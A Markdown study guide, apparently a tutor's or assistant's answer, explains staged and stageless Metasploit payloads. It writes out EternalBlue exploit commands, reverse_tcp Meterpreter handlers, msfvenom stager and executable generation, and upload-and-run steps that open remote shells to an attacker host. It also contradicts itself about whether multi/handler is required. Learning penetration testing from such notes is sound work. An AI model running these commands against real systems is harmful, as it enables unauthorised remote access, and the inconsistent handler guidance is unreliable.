# Metasploit Payload Types

## 🔑 Core Concept
Metasploit payloads deliver **shellcode** to compromised systems. Two fundamental types exist:

| Type | Delivery Method | Size | Stealth | Use Case |
|------|----------------|------|---------|----------|
| **Non-Staged** | Single payload sent entirely with exploit | Larger (≈300KB+) | Lower (big transfer) | Reliable networks, AV evasion via encoding |
| **Staged** | Two parts: stager → stage | Smaller stager (≈300B) | Higher (small initial footprint) | Restricted environments (small buffer sizes) |

---
# Staged Payloads (Two-Part Delivery)

## <u>Method 1</u>: **Exploit Module + Built-in Stager**

- You use an **exploit module** that **embeds the stager** in its shellcode.
- Example:
  ```msf
  use exploit/windows/smb/ms17_010_eternalblue
  set RHOSTS 192.168.1.10
  set PAYLOAD windows/x64/meterpreter/reverse_tcp   # ← staged payload
  set LHOST 10.10.100.8
  exploit
  ```
- What happens:
  1. Exploit sends **tiny stager** (≈300B) to target
  2. Stager connects back to your MSF console
  3. **MSF automatically sends the stage** (full Meterpreter)
  4. Meterpreter runs **in memory**

> ✅ **No separate `multi/handler` needed** — the exploit **is** the handler.

---
## <u>Method 2</u>: **Manual Stager Delivery + `multi/handler`**

- You **must start `multi/handler` first** to catch the connection and send the stage.
- Example:
  ```msf
  use exploit/multi/handler
  set PAYLOAD windows/x64/meterpreter/reverse_tcp   # ← staged
  set LHOST 10.10.100.8
  set LPORT 4444
  run
  ```
- Then on target, you run a **stager-only payload** (e.g., generated via `msfvenom -p windows/x64/shell/reverse_tcp` or embedded in HTA).
- When it connects, MSF sends the **stage** → full Meterpreter.

> ✅ **`multi/handler` is required** — it serves the stage.

- Now Generate the Tiny Stager (NO `>` REDIRECTION)

You **do NOT use `>`** to save to a file. Instead, generate a **ready-to-run command**:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.100.8 LPORT=4444 -f psh-cmd
```

✅ Output (copy ENTIRE line):
```text
powershell.exe -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAF...
```

> 🔑 **Critical**:  
> - This outputs a **command**, not a file  
> - Stager size: ~300–500 bytes (tiny)

- On target, **paste and run the entire command**:
   ```powershell
   powershell.exe -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAF...
   ```
- Handler sends **stage** → full Meterpreter runs in memory

---
# Stageless (Non-Staged) Payloads (One-Part Delivery)

## <u>Method 1</u>: **Generate with `msfvenom` + Upload/Execute Manually**

- You generate a **self-contained executable**:
  ```bash
  msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.100.8 LPORT=4444 -f exe > payload.exe
  ```
- You **upload it to the target** (via webshell, SMB, FTP, etc.)
- You **execute it manually** (e.g., `.\payload.exe`)
- It connects back **immediately** with **full Meterpreter**

> ✅ **No second download** — everything is in the file.

> ⚠️ **You still need `multi/handler` to catch the connection**:
> ```msf
> use exploit/multi/handler
> set PAYLOAD windows/x64/meterpreter_reverse_tcp   # ← stageless (note underscore)
> set LHOST 10.10.100.8
> set LPORT 4444
> run
> ```

## <u>Method 2</u>: **Use in Exploit (Rare)**

- Some exploits support stageless payloads directly (uncommon).
- You’d set:
  ```msf
  set PAYLOAD windows/x64/meterpreter_reverse_tcp
  ```
- But most exploits **only support staged** due to size limits.

---
## 🔑 Key Summary Table

| Approach | Payload Name | Requires `multi/handler`? | How Payload Reaches Target |
|--------|--------------|--------------------------|----------------------------|
| **Staged via Exploit** | `windows/x64/meterpreter/reverse_tcp` | ❌ No (exploit handles it) | Embedded in exploit shellcode |
| **Staged Manual** | `windows/x64/meterpreter/reverse_tcp` | ✅ Yes | You deliver stager (HTA, command, etc.) |
| **Stageless** | `windows/x64/meterpreter_reverse_tcp` | ✅ Yes (to catch reverse conn) | You upload full `.exe`/`.dll` |

---
## 🧠 Critical Notes

- **`/` vs `_` in payload name**:
  - `/meterpreter/` = **staged**
  - `_meterpreter_` = **stageless**
- **`multi/handler` is always needed for reverse connections** — whether staged or stageless.
  - For **staged**: it **sends the stage**
  - For **stageless**: it **only listens** (no extra data sent)
- **Stageless is larger** (~300–500 KB) — may not fit in small buffer overflows.
- **Staged is stealthier initially** — tiny stager avoids detection until stage downloads.

---
## ✅ Final Answer to Your Question

> **Staged**:
> 1. ✅ Use exploit module with `meterpreter/reverse_tcp` → exploit delivers stager + MSF sends stage  
> 2. ✅ Use `multi/handler` + manually deliver stager (e.g., HTA) → MSF sends stage on connect  

> **Stageless**:
> 1. ✅ Generate with `msfvenom -p meterpreter_reverse_tcp`  
> 2. ✅ Upload & execute manually  
> 3. ✅ Use `multi/handler` with matching stageless payload to catch the connection  

> 🔥 **You always need `multi/handler` for reverse TCP — but its role differs**:
> - **Staged**: active (sends stage)  
> - **Stageless**: passive (just listens)

